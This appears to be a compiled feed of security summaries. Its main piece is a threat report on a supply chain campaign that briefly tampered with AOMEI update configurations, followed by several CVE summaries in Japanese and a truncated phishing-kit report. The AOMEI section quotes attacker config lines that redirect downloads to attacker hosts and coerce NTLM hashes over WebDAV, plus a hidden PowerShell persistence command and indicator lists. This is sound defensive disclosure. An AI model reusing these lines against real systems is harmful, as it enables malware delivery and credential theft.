summary: Written by: Tyler McLellan Introduction Google Threat Intelligence Group (GTIG) and Mandiant investigated a software supply chain compromise campaign targeting the update infrastructure belonging to AOMEI Technology between April 2026 and July 2026. The threat actor conducted repeated, short-burst configuration tampering against AOMEI origin servers. Each tampering window remained active for only five to ten minutes before reverting to authentic versions. This is the first time that we have encountered a software supply chain compromise that was implemented with these very short windows, effectively evading traditional point-in-time triage and automated file scanning. The campaign delivered a multi-stage payload chain involving the newly tracked CROSSROAD downloader and SHINYROAD backdoor. The threat actor iteratively modified its tradecraft, pivoting its staging infrastructure from cloud providers to dedicated domains and legitimate cloud storage. This evolving staging setup makes it particularly challenging for defenders to establish effective infrastructure-based blocking or network controls. We attribute this activity to a threat cluster we are tracking as UNC7017. Based on available telemetry, impacted organizations spanned diverse sectors, including IT services, telecommunications, higher education and related entities in Australia, Brazil, India, Pakistan, Portugal, Singapore, South Africa, Spain, Switzerland, Türkiye, and the United States. That said, because the campaign attempted to deliver malware to any system polling the update distribution servers during the threat actor’s tampering windows, victimology was opportunistic and likely extends more broadly than the organizations we directly identified. This campaign was initially identified through collaborative research with the ManageEngine Threat Analysis Lab (METAL), part of Zoho Corporation, whose endpoint detection and response (EDR) telemetry first detected the activity in late May across multiple customer environments. We thank the METAL team for their proactive telemetry sharing and ongoing collaboration to help secure our mutual customer bases and the broader software ecosystem. Following this joint effort, GTIG notified potentially affected organizations and shared technical findings with AOMEI Technology. AOMEI reported that they took corrective action to secure their distribution servers. METAL’s analysis of this campaign is available in their blog . How AOMEI Update and Notification Systems Work AOMEI Backupper provides data backup, disk cloning, and disaster recovery, while AnyViewer facilitates remote desktop access and support. Users of these products rely on the ABMarket update flow and its associated background services ( Backupper.exe and ABNotify.exe ) that periodically poll remote endpoints over HTTPS for update notifications and promotional pop ups: Figure 1: AOMEI Update Mechanism Update Configuration ( down_html.ini ): The software periodically sends an HTTPS request to https://www2.aomeisoftware.com/download/abpopup/down_html.ini . This file contains the version number, the MD5 hash of the expected update package, and the URL where the client should download upgrade-now.zip . Notification Configuration ( Notifycfg.ini ): The software contacts https://account.aomeitech.com/Notifycfg.ini . This file instructs the local notification process ( ABNotify.exe ) what messages to display and specifies commands or programs located in the software’s local directory to execute. Under normal conditions, these files direct the client to download official files hosted on AOMEI’s own domain ( www2.aomeisoftware.com ). Campaign Overview Rather than maintaining a persistent, static modification on the vendor’s distribution servers, GTIG and METAL’s telemetry indicates UNC7017 conducted repeated, short-burst configuration tampering. We confirmed several tampering windows in 2026, alongside related malware samples observed in the wild starting in late April. However, given the short duration of these windows, it is probable that additional tampering occurred throughout the campaign that remained outside our visibility. Systems checking for updates during an active window received malicious instructions, while systems checking before or after received clean, authentic files. During the brief tampering windows, the threat actor modified the update settings file on the update server to redirect the software to download a malicious ZIP package from attacker-controlled servers instead of legitimate updates. The threat actor also altered the notification settings file on the update server to abuse the software’s automatic notification service, forcing the system to immediately execute the downloaded malware locally. If a user’s application checked for updates while the threat actor’s modifications were active, then the application would download the trojanized update and execute malware. In cases where altered configuration files were active, the threat actor directed clients to download a weaponized ZIP archive containing CROSSROAD, an initial downloader responsible for environment validation and staging secondary components. CROSSROAD subsequently established scheduled task persistence to deploy SHINYROAD, a modular backdoor framework delivered via trojanized administration utilities to facilitate covert command and control. Short Burst Supply Chain Tampering A defining characteristic of UNC7017's operational security is its reliance on ephemeral, time-compressed server modifications. Across all directly observed waves, the adversary avoided leaving malicious configurations resident on AOMEI's update servers: May 28: 10-minute exposure window (05:40 – 05:50 UTC) July 16: 6-minute exposure window (08:33 – 08:39 UTC) July 20: 5-minute exposure window (10:35 – 10:40 UTC) At the conclusion of each window, UNC7017 reverted both down_html.ini and Notifycfg.ini to their legitimate contents. This hinders post-incident vendor audits, minimizes the window for network defenders to capture live malicious server responses, and restricts compromise to clients polling for updates during those exact minutes. Weaponizing Native Update Logic: down_html.ini and Configuration Bloat To compromise endpoints without relying on software vulnerabilities, UNC7017 abused the AOMEI client's legitimate update and popup rendering workflow. By default, the client downloads update archives into its Tmphtml directory, unpacks them to the local html/ directory, and processes instructions from two remote configuration files: down_html.ini and Notifycfg.ini. To ensure the AOMEI client accepted and extracted the weaponized upgrade-now.zip archive, UNC7017 systematically incremented the minor build version (“thrid”) and updated the expected MD5 checksum in down_html.ini during each tampering window: [Date] -Url=https://www2.aomeisoftware.com/download/abpopup/upgrade-now.zip +Url=https://promotion.storage-data.com/download/abpopup/upgrade-now.zip Name=upgrade-now [Version] maj=8 min=2 -thrid=5 +thrid=6 [MD5] -Val=EE89C99F3753231771170F5D9CBBAE1E +Val=31323E7E738230FA6A8DEEF2B7894666 Figure 2: July 16 tampering of down_html.ini redirecting downloads to promotion.storage-data.com with incremented version (thrid=6) and synchronized MD5 hash. During the 6-minute window on July 16, UNC7017 simultaneously modified Notifycfg.ini (SHA256: d2f9ef2429312667f0512504b6a19ba4a9cc5514f1b2933923dd42f75a1c5934), injecting over 35,000 lines of repetitive configuration sections named [dummy_XXXXXX]. This extreme configuration bloat was structured to override standard client version checks forcing the client to trigger an update regardless of its installed version and immediately execute the unpacked CROSSROAD dropper (upgrade-now.exe) from the local html/ directory. Infrastructure Shifts Between April an July 2026, UNC7017 shifted its staging and delivery infrastructure between public cloud buckets and actor controlled lookalike domains, likely to test payload delivery and masquerade as legitimate vendor traffic. Infrastructure Shifts Early Cloud Staging (April–May 2026): Early CROSSROAD payloads ( upgrade-now.exe observed May 20) relied on Alibaba Cloud Object Storage ( serv.oss-cn-hongkong.aliyuncs.com ). Dedicated Domain Infrastructure (July 1–7, 2026): The threat actor transitioned to dedicated, vendor-themed domains ( storage-data.com , promotion.storage-data.com , aomei.storage-data.com ). Hybrid Cloud Delivery Split (July 20, 2026): During the 5-minute window on July 20, the threat actor modified down_html.ini to direct initial client downloads to a public Google Cloud Storage bucket ( storage.googleapis.com/aomeiupdate/upgrade-now.zip ) rather than storage-data.com . This tactical shift allowed the initial download to bypass enterprise proxy filters that block Newly Registered Domains (NRDs), while the executed CROSSROAD loader continued to leverage storage-data.com for secondary payload retrieval and C2 communications. [Date] Url=https://storage.googleapis.com/aomeiupdate/upgrade-now.zip Name=upgrade-now [Version] maj=8 min=2 thrid=7 [MD5] Val=BF73C4391B58CA95220CE3AE03F66DCF Figure 3: July 20 modification of down_html.ini utilizing Google Cloud Storage (thrid=7) to evade Newly Registered Domain (NRD) perimeter blocks. WebDAV NTLM Credential Coercion On July 20, UNC7017 introduced a secondary exploitation vector inside Notifycfg.ini. Prior to tampering, Notifycfg.ini displayed a legitimate 400x380 promotional banner advertising "World Cup Deals." The threat actor replaced this banner with an invisible 1x1 pixel window (Width=1, Height=1) assigned maximum execution priority (Priority=9999) that instructed the client to render a remote HTML file over a universal naming convention (UNC) WebDAV path: [PopWindow1] ID=307 Title=20260408-AB Flash Sale (All Lang 不含EN) Address="file://8.210.84.56/DavWWWRoot/campaign/24hour-flash-sale.html" Width=1 Height=1 Priority=9999 Figure 4: Malicious Notifycfg.ini configuration from July 20 implementing an invisible 1x1 popup window to coerce WebDAV/NTLM authentication to 8.210.84.56 . By forcing the AOMEI client to request a remote file:// resource via WebDAV ( DavWWWRoot ), UNC7017 created a silent credential harvesting mechanism capable of coercing endpoints into transmitting NetNTLMv2 authentication hashes to the actor-controlled IP address ( 8.210.84.56 ) without user visibility. Malware Delivery & Post-Exploitation Tooling Across the campaign waves, UNC7017 deployed a consistent chain of custom loaders and commercial/open-source post-exploitation frameworks: Defense Evasion via Timestomping: Analysis of an early CROSSROAD dropper (upgrade-now.exe) submitted to VirusTotal on May 20 revealed that the threat actor manipulated PE compilation timestamps to display fabricated 2024 build dates in an effort to complicate forensic timeline analysis. Modified Radmin Server Backdoor: During the May 28 wave, the unsigned loader dropped into the html/ directory executed rsetup64.exe /intsetup, silently installing a modified version of the commercial remote administration tool Radmin Server to establish persistent remote access. Adaptix C2 Integration: Since at least early July 2026, the threat actor was observed deploying the Adaptix C2 framework across its storage-data.com infrastructure. The Primary Downloader: CROSSROAD The primary Stage-2 downloader ( upgrade-now.exe , SHA256: 9a58e8f49edf5644e5728f74cf36f560d3d486fa51db4db69d927963c7aca450 ) is a 64-bit Windows executable written in C, tracked by GTIG as the CROSSROAD malware family. Delivered inside upgrade-now.zip , CROSSROAD is responsible for environment validation, active endpoint cleanup, staging the secondary payload bundle, and establishing scheduled task persistence for the Stage-3 backdoor suite. Path Verification: As part of its configuration routine, CROSSROAD checks whether its file path contains the substring AOMEI . If the substring is absent, it initiates a self-deletion routine; however, it does not abort, continuing both its background configuration cleanup and its downloader routines regardless. Execution Guardrails: Before proceeding with secondary downloads, CROSSROAD enforces two primary checks: Geolocation Check: Queries external domain name system (DNS) ( myip.opendns.com , o-o.myaddr.l.google.com ) and HTTP reflection services ( checkip.amazonaws.com , api.ipify.org , ifconfig.me/ip , icanhazip.com ) using custom User-Agents ( Anyviewer-loader/1.0 , Anyviewer-ipcheck/1.0 ). In specific execution branches, if the returned country code is "CN" (China), the loader aborts its primary payload execution path. Lock Mutex: Acquires the named mutex Global\{F9E6E3C0-E11A-4F85-9944-AF4AD6E05883} to prevent multiple concurrent instances on the same host. Host Artifact Reversion & Anti-Forensics: To complicate post-incident triage and forensic reconstruction, the loader systematically reverts local configuration states during its execution cycle. The malware parses down_html.ini (located at <install_dir>\..\..\ ), restoring the update thread parameter ( thrid ) to its default value of 5 and pointing the update download URL back to legitimate AOMEI distribution infrastructure ( https://www2.aomeisoftware.com/download/abpopup/ ). Stage-3 Payload Staging & Extraction: If environment checks pass, CROSSROAD downloads https://promotion.storage-data.com/config/component.zip (also observed as en.zip), to %TEMP%\svc<random_hex>.tmp, and unpacks its contents into the user’s local application data directory using an embedded miniz library. Persistence via Scheduled Task: To ensure continuous execution of the staged payload bundle, upgrade-now.exe registers a persistent scheduled task named RadminComponentRuntime (configured with the description”Radmin Component runtime checkable.”). The task is set to execute %LOCALAPPDATA%\Radmin\FamItrfc.exe --runtimechk every three hours. Self-Deletion ( --nitrod ): After extracting the payload bundle and creating the scheduled task, CROSSROAD purges itself from disk. To bypass Windows file-locking constraints, the executable drops a copy of itself to the temporary directory and executes it with the --nitrod parameter, passing its parent PID via NITRODP and original executable path via NITRODT . The child process waits for the parent to terminate, renames the original binary's primary :$DATA stream to an alternate data stream named :wtfbbq via SetFileInformationByHandle , and flags FileDispositionInfo with DeleteFile = TRUE to unlink the binary on handle close. Version Information: The executable contained standard PE version metadata with a notable typo string: "ProductName: AOMEI Update Compent" . Figure 5: Victim Profiling, Malware Delivery Logic Stage-3 Payload: SHINYROAD and Radmin Suite The payload archive unpacked into %LOCALAPPDATA%\Radmin\ by CROSSROAD contains a Famatech Radmin 3.x administration bundle used to deliver the SHINYROAD modular backdoor framework. The malware contains no native persistence mechanism of its own and relies entirely on the external scheduled task registered by CROSSROAD for execution. Execution via DLL Search-Order Hijacking ( BlkScrDl.dll ): Execution begins when the persistent RadminComponentRuntime scheduled task launches the legitimate, signed Radmin binary %LOCALAPPDATA%\Radmin\FamItrfc.exe --runtimechk (or FamItrf2.exe ). During startup, the Radmin executable is hijacked into loading the attacker's unsigned DLL, BlkScrDl.dll , via search-order hijacking. The adversary named this DLL to masquerade as Radmin's legitimate "blank screen" driver library. Shared Memory & In-Process COM Server Staging: Upon execution, BlkScrDl.dll locates config.zip in its execution directory, maps its raw contents into a shared memory section named Local\963d3c60-d406-4ad6-aa1e-dc8e45061ccf , and dynamically registers csvc\RuntimeComponent.dll as an in-process COM Server under CLSID {21191641-0D7F-4CD9-9572-01AAE6E7851B} and AppID {9AD3E98A-4C7E-4F37-982D-D73D41E4F91B} . COM-Triggered Stage-2 Initialization & Embedded PocketPy VM: When the Radmin process instantiates the registered CLSID, the Windows COM subsystem loads the DLL. The DLL reads config.zip directly from shared memory, extracts the encrypted payload metadata.dat , and decrypts it using ChaCha20 with an HMAC-SHA256 derived key and IV. The decrypted payload consists of compiled Python bytecode, which RuntimeComponent.dll executes within an embedded PocketPy interpreter, establishing initial C2 connectivity to 8.218.65.184:443 . Evolution of the SHINYROAD Architecture Analysis of earlier campaign variants revealed that SHINYROAD relies on custom C-level extensions (_pyio_compat, _pyio_struct, and pkpy) to avoid loading standard Python libraries on disk: Custom Binary C2 Protocol : Earlier variants communicated over raw TCP ( 8.218.65.184:41397 ). The agent generates a unique ID by fingerprinting the hostname and username, authenticates via a hard-coded handshake key, and dynamically transitions all subsequent communication to use symmetric encryption derived from this unique ID. In-Memory Capabilities : The engine supports interactive remote shell access (os.system), traffic chaffing (generating randomized junk packets to disrupt network signatures), and dynamic in-memory extension via the pkpy WorkPool thread manager without writing script modules to disk. Post-Exploitation: Nitro PDF Theme & Adaptix C2 In mid-July 2026, following the successful deployment of SHINYROAD, telemetry identified later-stage activity where UNC7017 pushed down ADAPTAGENT, the client portion of the Adaptix C2 post-exploitation framework. To blend in or appear as user-downloaded activity, these payloads masqueraded as Nitro PDF promotional and scanning tools ( NitroPromotion.exe ): Persistence: The malware installed a scheduled task named \NitroRuntime that executed: powershell -Command "Start-Process 'C:\Users\<USER>\AppData\Local\Temp\NitroPromotion.exe' -WindowStyle Hidden" Figure 6: NitroRuntime scheduled task persistence Adaptix C2 Beaconing : The executable sideloaded Eztwain4.dll (ADAPTAGENT) from %LOCALAPPDATA%\Nitro Pro\ , which established periodic 2-minute beacons to 8.210.84.56:6800 . Outlook and Implications This campaign highlights a broader evolution in software supply chain attack methodologies. Supply chain intrusions have historically focused on inserting backdoors into software source code or tampering with developer build pipelines (e.g., SolarWinds , 3CX ). While highly impactful, compromised source trees leave persistent binary signatures in official release files that can be discovered during post-release binary analysis. UNC7017's use of ephemeral configuration tampering represents a lower-overhead, higher-stealth alternative: Anti-Analysis by Design: By restricting configuration changes to five to ten minute windows, the vast majority of legitimate users and automated repository crawlers only encounter authentic, vendor-signed files. Selective Exploitation : Threat actors can selectively compromise target organizations that maintain frequent polling intervals while minimizing their exposure window on vendor infrastructure. Dual-Pronged Approach : Combining software update redirection with invisible WebDAV NTLM coercion could allow adversaries to harvest credentials from passive users even if binary payload execution is blocked. Co-opting Commercial Software : Deploying unmodified versions of legitimate administration tools (such as Radmin 3.x) to masquerade sideloaded covert channels illustrates how adversaries blend commercial remote management capabilities with hidden backdoor modules. Remediation and Hardening Defenders should focus on behavioral profiling of updater processes, specifically monitoring for unsigned child processes spawned by background update runners and unauthorized network redirection originating from trusted desktop software. For broader recommendations on securing software delivery pipelines, please refer to our previously published Mitigation Guidance for Supply Chain Compromise . Vendor Notification & Architecture Hardening On July 17, 2026, Mandiant notified AOMEI Technology regarding the observed configuration tampering on their update infrastructure and provided relevant indicators. AOMEI subsequently responded on July 29, 2026, stating that corrective actions had been taken. Why Server-Side Remediation Does Not Disinfect Endpoints Crucially, server-side remediation does not clean endpoints that downloaded malicious updates during earlier tampering windows. Because the tampering occurred in brief, short bursts, systems that received these files may remain compromised without the organization's knowledge unless proactive endpoint hunting and remediation are performed. Persistent Resident Payloads : Endpoints that polled for updates during an active tampering window downloaded and staged persistent payloads (via scheduled tasks) that remain fully operational even after the vendor restores authentic .ini files on the origin servers. Obscured Root Cause : While the subsequent backdoor activity and scheduled tasks generate detectable endpoint telemetry, the ephemeral delivery vector obscures the initial intrusion mechanism. Because server tampering lasted approximately 5 minutes—and the loader actively reverted local configuration files—investigators reviewing vendor update URLs hours later will observe only benign, authentic infrastructure, complicating root cause analysis and patient-zero identification. Hunting Imperative : Organizations running AOMEI software cannot assume they are protected solely because the vendor took corrective server-side action. Enterprise security teams must perform retrospective endpoint and network hunts across the entire April–July time frame using the indicators and YARA rules provided in this post. Guidance for Software Vendors & Developers Software supply chain security extends beyond developer workstations and build pipelines. When desktop software relies on remote configuration files to manage update and notification behaviors, adversaries can target the distribution layer rather than the source code. To defend against configuration tampering and distribution-channel hijacking, software vendors should implement the following security controls: End-to-End Cryptographic Signature Verification : Client applications must cryptographically verify Authenticode digital signatures and validate vendor certificates on all downloaded executables and archives before extraction or execution. Update clients should never rely solely on transport-layer HTTPS or remote checksums (such as cleartext MD5 values in an unauthenticated configuration file). Cryptographically Signed Configuration Files : Remote configuration files (.ini, .json, or .xml) should be digitally signed using asymmetric public key cryptography. If an origin server or content delivery network (CDN) is modified without authorization, client software will detect the invalid signature and reject the configuration. Domain Allowlisting and Destination Pinning : Software update clients should enforce strict destination pinning, restricting update downloads exclusively to official, pre-approved vendor domains and CDNs. Update engines should reject redirection to arbitrary third-party domains or generic public cloud storage buckets. Restricting Uniform Resource Identifier (URI) Schemes in In-App Handlers : Embedded web views, promotional popups, and notification handlers should strictly enforce secure web protocols ( https:// ) and explicitly disallow local file ( file:// ) and UNC WebDAV schemes to prevent external NTLM credential coercion. Decoupling Core Updates from Marketing Channels : Separating essential software maintenance routines from dynamic promotional popups and notification banners reduces the attack surface and ensures that advertising channels cannot trigger local code execution. Origin Integrity Monitoring and Access Controls : Origin web servers and object storage buckets hosting update metadata should enforce strict access controls, multi-factor authentication, and automated real-time file integrity monitoring (FIM) with immediate alerting on configuration changes. Guidance for Security Operations (SOC) & Incident Responders Overcoming the "Point-in-Time" Triage Pitfall The short-burst nature of this attack creates a unique challenge for incident response: The Triage Trap : When an EDR alert fires for a suspicious process spawned by an updater, SOC analysts frequently attempt to validate the alert by navigating to the vendor's download URL or checking URL reputation. Because the threat actor reverted the remote configuration files within five to ten minutes, the vendor's server returns authentic, clean files most of the time, leading analysts to mistakenly dismiss the detection as a false positive. Actionable IR Protocol : Defenders must not rely on live web checks. Incident responders must preserve and analyze the endpoint-cached configuration files in %PROGRAMFILES(X86)%\AOMEI\*\Tmphtml\ and review proxy/firewall telemetry corresponding to the precise second the alert was triggered. Camouflaged Follow-on Activity The deployment of Adaptix C2 under the guise of Nitro PDF can mislead analysts into treating alerts as isolated, user-initiated software downloads rather than staged lateral movement. Responders must trace updater parentage to identify root-cause supply chain tampering. Endpoint and Network Hardening Actions Endpoint File Checks Inspect systems for the following directories and artifacts. Defenders must distinguish between malicious payloads and legitimate signed binaries abused for search-order hijacking: Directory Malicious Artifacts (Primary IOCs) Abused Legitimate / Support Binaries Defender Triage & Hunting Guidance %LOCALAPPDATA%\Radmin\ BlkScrDl.dll, csvc\RuntimeComponent.dll, config.zip, metadata.dat FamItrfc.exe, FamItrf2.exe, WinLpcDl.dll, WinLpcDl2.dll Do not dismiss if executables are signed: FamItrfc.exe is authentic Famatech software abused to hijack BlkScrDl.dll . Alert on unsigned DLLs and executions with --runtimechk . %LOCALAPPDATA%\Nitro Pro\ Eztwain4.dll (ADAPTAGENT), NitroPromotion.exe mfc140u.dll (Microsoft MFC runtime), Nitro_Scan2PDFApp.exe Payloads masquerade as Nitro PDF tools. Eztwain4.dll is sideloaded by the executables. Look for parent PowerShell processes spawned with -WindowStyle Hidden . %TEMP%\ svc*.tmp, en\ — Ephemeral child processes spawned with --nitrod to purge CROSSROAD via NTFS stream overwrites ( :wtfbbq ). AOMEI Install Paths ( Tmphtml\, html\ ) upgrade-now.zip, upgrade-now.exe (CROSSROAD) down_html.ini, Notifycfg.ini Staging location for the AOMEI update flow. Check for unauthorized executable drops in the web UI html\ directory. Table 1: Endpoint file checks Scheduled Tasks and Registry Scheduled Tasks: Check for unauthorized tasks named \NitroRuntime or \RadminComponentRuntime . Registry: Check \REGISTRY\MACHINE\SYSTEM\Software\Microsoft\TIP\AggregateResults\data for unusual binary blobs. Network Defenses Block outbound network connections to promotion.storage-data.com , aomei.storage-data.com , storage-data.com , 8.210.84.56 , 47.239.60.117 , and 8.218.65.184 . Block outbound SMB (TCP 445) and WebDAV traffic to external IP addresses to prevent NTLM credential coercion. Inspect proxy and web gateway logs for the User-Agent Anyviewer-loader/1.0 or requests to Alibaba Cloud OSS endpoint serv.oss-cn-hongkong.aliyuncs.com . summary_excerpt: Written by: Tyler McLellan Introduction Google Threat Intelligence Group (GTIG) and Mandiant investigated a software supply chain compromise campaign targeting the update infrastructure belonging to AOMEI Technology between April 2026 and July 2026. The threat actor conducted repeated, short-burst configuration tampering against AOMEI origin servers. Each tampering window remained active for only five to ten minutes before reverting to authentic versions. summary: On 14 October 2026, Cisco published a security advisory addressing a critical vulnerability affecting the Advanced Malware Protection (AMP) feature of Cisco Secure Email Gateway. This vulnerability could allow an unauthenticated, remote attacker to write arbitrary files and execute commands with root privileges on the underlying operating system. The Cisco PSIRT is aware of active exploitation of this vulnerability. CERT-EU strongly recommends updating the Content Scanner Tools package or upgrading Cisco AsyncOS Software to a fixed release as soon as possible, prioritising appliances reachable from the internet. CERT-EU also recommends checking all affected appliances for indicators of compromise.

summary: Joomla拡張機能 - svenbluege.de の Event Gallery拡張機能バージョン6.6.0未満には、バックエンドリストのタスクにおいてクロスサイトリクエストフォージェリの脆弱性があります。バックエンドリストのボタンが呼び出す8つのタスクはフォームトークンを確認していませんでした。対象のタスクは、デフォルトの支払い方法、配送方法、画像タイプセット、注文ステータスおよびウォーターマークの設定です。また、イベントをショップに追加または削除すること、イベントのメイン画像の選択および画像がメイン画像としてのみ表示されるかどうかの設定も含まれます。さらに、イベントの画像の並べ替えも該当します。これにより、他のウェブサイト上の用意されたページがログイン中の管理者の名前でこれらのタスクを実行し、設定やフラグを変更できる可能性があります。ただし、この方法で削除や閲覧はできず、注文にも影響はありません。

summary: Joomla拡張機能 - svenbluege.de - Event Gallery拡張機能のGoogleフォトピッカー（バージョン6.6.0未満）においてサーバーサイドリクエストフォージェリ（SSRF）が発生します。バックエンドアップロードページのGoogleフォトピッカーは、GoogleフォトアカウントのOAuthアクセストークンを使用してサーバー経由で選択された画像のサムネイルを取得します。この処理では、リクエストから取得したアドレスを検証せずに使用し、かつフォームトークンを要求しませんでした。そのため、別のウェブサイトに用意されたページがサーバーに対して任意のアドレスにアカウントのアクセストークンを送信させることや、ログインしている管理者の名義でサーバー内ネットワークのアドレスを取得させることが可能です。また、「管理」権限を持つバックエンドユーザーは同様の操作を直接行えます。アクセストークンは約1時間有効であり、そのアカウントのピッカーセッションがアクセスできる範囲に影響を与えます。

summary: Backstageは開発者用ポータルを構築するためのオープンフレームワークです。バージョン4.1.0より前の@backstage/plugin-scaffolder-backendパッケージには、Scaffolderタスクのログに秘密情報から派生した値が露出する可能性がありました。scaffolder.defaultEnvironment.secretsを機密情報として設定し、攻撃者がScaffolderテンプレートの作成または変更を許可するデプロイメントが影響を受けます。テンプレートの作成者は、テンプレートの反復処理中に使用された秘密情報から派生した値を永続化させることが可能であり、その結果として生成されたタスクログにアクセスできるユーザーに対して公開される可能性がありました。この問題はバージョン4.1.0で修正されています。

summary: music-metadataは音声および映像メディアファイルのメタデータパーサーです。バージョン11.16.0より前のMP4パーサーには、攻撃者が制御可能な64ビットの拡張アトムサイズを受け入れ、それをJavaScriptのNumberに変換した後、その結果得られたペイロード長を用いてアトム固有のreadToken呼び出しを行う処理があります。しかし、そのアトムが親アトムや利用可能な入力範囲内に収まっているかどうかの検証を行う前に処理を進めてしまいます。非常に小さいMP4ファミリーファイルを用いることで、mvhd、stsd、stsz、dateなどのアトムに対するペイロード解析に過剰な長さを経路誘導でき、大量のメモリ確保試行や入力終端検証前の処理失敗を引き起こしてしまいます。そのため、信頼されていないMP4系メディアを解析するアプリケーションはサービス拒否（DoS）攻撃を受ける可能性があります。この問題はバージョン11.16.0で修正されています。

summary: Java向けBouncy Castle 1.86以前のMLS実装（org.bouncycastle.mls）は、RFC 9420のuint32型のleaf_indexを符号付きintで扱っているため、最上位ビットがセットされたワイヤー値は負の数としてデコードされます。これは不正な入力ではなく正当なエンコーディングであり、MLS相互運用テストベクターは完全な範囲の往復を確認しているため、引き続きデコードする必要があります。GroupKeySet.SecretTree.hasLeafおよびGroup.validateRemoveは、デコードされた値を木構造のリーフ数と直接比較しており、符号付き比較では負のintが正の境界値より小さいと扱われるため、範囲外の送信者がメンバーシップチェックを通過していました。hasLeafの場合、保護されていないPrivateMessageのSenderDataがLeafIndex.directPathをNodeIndex.parent()の算術演算で操作し、木のルートに到達せず、JVMのヒープが枯渇するまでノードリストを無限に増やしてしまいます。したがって、現在の任意のグループメンバーからの小さな単一メッセージでも、グループの他のすべてのメンバーに対してサービス拒否を引き起こす可能性があります。現在は両方の比較ともInteger.toUnsignedLongを介して値を符号なしとして解釈し、どのようにエンコードされていても範囲外の送信者を拒否します。そのため、正しい形式のリーフインデックスには影響しません。

summary: Triliumはオープンソースの階層型ノートアプリケーションです。バージョン0.104.0未満では、デフォルトでオンになっている「Safe import」フィルターがshareTemplateリレーションを無害化できません。このリレーションは危険としてマークされていないため、攻撃者が提供したインポートアーカイブによりサーバーサイドのテンプレートを植え付け、リモートコード実行を引き起こす可能性があります。このリレーションは組み込みの危険な属性リストから除外されているため、他のコード読み込みリレーションと異なりインポート時に無効化されません。被害者が後でインポートされたノートを公開すると、公開共有レンダラーがリンクされたEJSコードノートの生のバイト列をejs.renderに渡し、サーバーのNodeプロセスでコンパイルします。共有されたノートへの認証されていないリクエストは、その攻撃者のJavaScriptをrequire、process、ファイルシステム、ネットワークへの完全なアクセス権限と共に実行させます。この問題はバージョン0.104.0で修正されています。

summary: Triliumはオープンソースの階層型ノート作成アプリケーションです。バージョン0.104.0以前では、自動画像ダウンロード機能がノート内のimgタグに含まれるfile:// URLを受け入れ、パスの検証なしに参照されたローカルファイルを読み取ってしまいます。これにより、認証済みの任意のユーザーがTriliumプロセスが読み取れる任意のファイルを漏洩させる可能性があります。テキストノートが保存されると、TriliumはHTML内の画像ソースをスキャンし、外部のものをダウンロードします。HTMLサニタイザでfileスキームが許可されているため、file:///etc/passwdのようなソースはそのままファイルシステムの読み取りに渡され、その内容がノートの添付ファイルとして保存され、ユーザーはそれを取得できます。同じ仕組みに対して/dev/zeroのような無制限のソースを指定すると、制御不能なメモリ割り当てが発生し、サーバープロセスがクラッシュします。この機能はデフォルトで有効であり、Web UI、ETAPI、Webクリッパー、ノートのインポートを通じてアクセス可能であり、認証済みセッションまたはETAPIトークンがあれば利用できます。この問題はバージョン0.104.0で修正されました。

summary: Brocade Fabric OS バージョン 10.0.1 未満のセキュリティライブラリコンポーネントには、スタックベースのバッファオーバーフロー脆弱性があります。管理表示用にアップロードされた X.509 PEM 証明書を解析する際、システムは内部メモリバッファに文字列トークンをコピーする前に、認証局キー識別子（AKI）拡張子の長さを適切に検証しません。カスタム証明書をインポートする権限を持つ管理特権認証済みユーザーは、意図的にサイズが大きすぎる AKI 拡張子を含む証明書を提供できます。システムが証明書属性を処理またはレンダリングすると、これがスタックメモリの破損を引き起こし、管理デーモンのクラッシュによってサービス拒否（DoS）状態を引き起こす可能性があります。

summary: Brocade Fabric OS バージョン 10.0.1 未満のウェブ管理インターフェースには、入力検証および出力エンコードに関する脆弱性が存在します。Federated Authentication（FA）を設定する際、システムは Identity Provider（IdP）の発行者パラメータを適切にサニタイズしません。認証済みの管理者、もしくはインポート処理中に細工されたFA構成ファイルを提供可能な攻撃者は、任意のウェブサーバディレクティブを注入できます。これにより、ウェブ管理デーモンの起動を妨げてサービス拒否を引き起こしたり、ウェブサーバのセキュリティ制御を変更したりする可能性があります。

summary: Linuxカーネルにおいて、以下の脆弱性が修正されました。drm/virtio: Xen上でリソースバックにDMA APIを使用するXenのPVドメインでは、ページアドレスがホストがアクセスするために使用する実機のアドレスと何の関連もありません。virtio_ring.cはこれを正しく処理しており、vring_use_map_api()はVIRTIO_F_ACCESS_PLATFORMの有無に関係なく任意のxen_domain()に対してtrueを返します。virtio-gpuも同様の判断を独自に行っていますが、そのコードは特徴ビットだけを参照しています。bool use_dma_api = !virtio_has_dma_quirk(vgdev-＞vdev);QEMUはデフォルトでvirtio-vgaに対してiommu_platformを設定しないため、VIRTIO_F_ACCESS_PLATFORMは交渉されず、use_dma_apiはfalseになります。するとvirtio_gpu_object_shmem_init()はフレームバッファのバックページをsg_phys()を使ってホストに記述します。これらはゲスト物理アドレスです。PVドメインでは、それらはホスト側で別のドメインに属するページに解決されるため、ホストは無関係なメモリをスキャンしてしまいます。この判断処理をvirtio_gpu_use_dma_api()に移動し、vring_use_map_api()と同様にxen_domain()のチェックを追加しました。この変更によりvirtgpu_vq.c内のdma_sync_sgtable_for_device()呼び出しも有効になります。これはswiotlbが関与している場合に正確性のために必要となります。この問題はQEMU 8.2上のXen 4.21 PV dom0（virtio-vga使用）環境で、ディストリビューション6.8カーネルおよび6.18 LTSカーネルの両方で再現されました。PVH dom0はアイデンティティマップされているため問題なく動作し、この修正は不要です。影響を受けるのはPV dom0のみです。

summary: Linuxカーネルにおいて、以下の脆弱性が修正されました。:wifi: mt76: mt7921: CLCファームウェアレコードの検証についてです。CLC領域はファームウェアによって供給されますが、ローダーは領域数と各レコードの長さを信用しています。破損したイメージにより、領域テーブルのポインタがファームウェアバッファの前に位置したり、レコードループが進行しなかったり、phy-＞clcの範囲外を参照してしまう可能性があります。そのため、デリファレンスやコピーを実行する前に、テーブルおよびレコードの境界を必ず検証する必要があります。

summary: Key findings A disruption action targeting prominent players across the Chinese-speaking phishing and fraud ecosystem struck a blow to the most high-volume threats in Proofpoint data. Proofpoint supported Microsoft and other private and public partners in the civil lawsuit and takedown action. The highest-volume direct email threats in Proofpoint campaign data come from three phishing kits our researchers named CoGUI, CoAceV, and CoFish_Ws, which all actively target Japanese organizations. These are part of the targeted actions. Campaigns linked to these phishing kits impersonate well-known companies, mainly consumer and finance brands, and distribute hundreds of millions of messages. Proofpoint assesses with high confidence that all these phishing kits have common roots and are used by overlapping affiliates. The disruption that includes broader ecosystem enablers YAM Store and Iron Man is likely to impact the efficacy and success of these phishing kits, potentially causing operational, reputational, and financial damage to the threat actors. Overview A recent disruption targeted a group of Chinese-speaking cybercrime threat actors and the infrastructure supporting their credential phishing activities. CoGUI and related infrastructure was disrupted in 